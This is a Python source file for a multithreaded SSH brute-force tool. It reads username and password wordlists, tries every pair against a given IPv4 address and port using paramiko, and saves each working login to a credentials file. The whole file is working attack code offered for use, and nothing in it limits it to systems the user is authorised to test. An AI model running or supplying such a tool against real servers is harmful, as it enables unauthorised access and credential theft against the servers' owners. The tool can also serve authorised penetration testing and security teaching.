'''
Created on Mar 07, 2023
@author: shdennlin

porject referece: https://github.com/davidbombal/ssh_bruteforcing
'''
import argparse
import logging
import os
import threading
import time
from logging import NullHandler

from paramiko import (AuthenticationException, AutoAddPolicy, SSHClient,
                      ssh_exception)

parser = argparse.ArgumentParser(description="Simple SSH Brute Forcer")
parser.add_argument('-i', '--ipv4', help='Input IPv4', required=True)
parser.add_argument('-port', '--port', help='SSH port, default: 22', default=22)
parser.add_argument('-u', '--username', help='Input username file', required=True)
parser.add_argument('-p', '--password', help='Input password file', required=True)
parser.add_argument('-l', '--logfile', help='log file output location, default: "./credentials_found.txt"',
                    default="./credentials_found.txt")
# parser.add_argument('-t','--thread', help='') //TODO: limit the thread number
args = parser.parse_args()

# create the empty file
with open(args.logfile, "w") as f:
    pass


# This function is responsible for the ssh client connecting.
def ssh_connect(host, username, password):
    ssh_client = SSHClient()
    # Set the host policies. We add the new hostname and new host key to the local HostKeys object.
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())

    while True:
        try:
            # We attempt to connect to the host, on port 22 which is ssh, with password, and username that was read from the csv file.
            ssh_client.connect(host, port=args.port, username=username,
                               password=password, banner_timeout=300)
            # If it didn't throw an exception, we know the credentials were successful, so we write it to a file.
            with open(args.logfile, "a") as fh:
                # We write the credentials that worked to a file.
                print("{username}:{password} found. <==================".format(username=username, password=password))
                fh.write("{username}:{password}\n".format(username=username, password=password))
            return
        except AuthenticationException:
            print("{username}:{password} is Incorrect.".format(username=username, password=password))
            return
        except ssh_exception.SSHException:
            time.sleep(0.5)
            continue
        except Exception as e:
            print(e)
            os._exit(0)

# The program will start in the main function.


def main():
    print("[*] Simple SSH Brute Forcer")
    print("[*] Brute Forcing {}".format(args.ipv4))

    logging.getLogger('paramiko.transport').addHandler(NullHandler())

    # read usernames and passwords
    u_fp = open(args.username, "r")
    usernames = u_fp.readlines()
    print("[*] Loaded {usernames} Usernames".format(usernames=len(usernames)))
    p_fp = open(args.password, "r")
    passwords = p_fp.readlines()
    print("[*] Loaded {passwords} Passwords".format(passwords=len(passwords)))

    print("[*] Brute Force Starting")
    threads = []
    for u in usernames:
        u = u.strip()
        for p in passwords:
            p = p.strip()

            #  We create a thread on the ssh_connect function, and send the correct arguments to it.
            t = threading.Thread(target=ssh_connect, args=(args.ipv4, u, p,))
            # We start the thread.
            threads.append(t)
            t.start()
            # We leave a small time between starting a new connection thread.
            time.sleep(0.2)

    u_fp.close()
    p_fp.close()

    # wait for all threads to complete
    for t in threads:
        t.join()

    print("[*] Brute Force Completed")


if __name__ == "__main__":
    main()
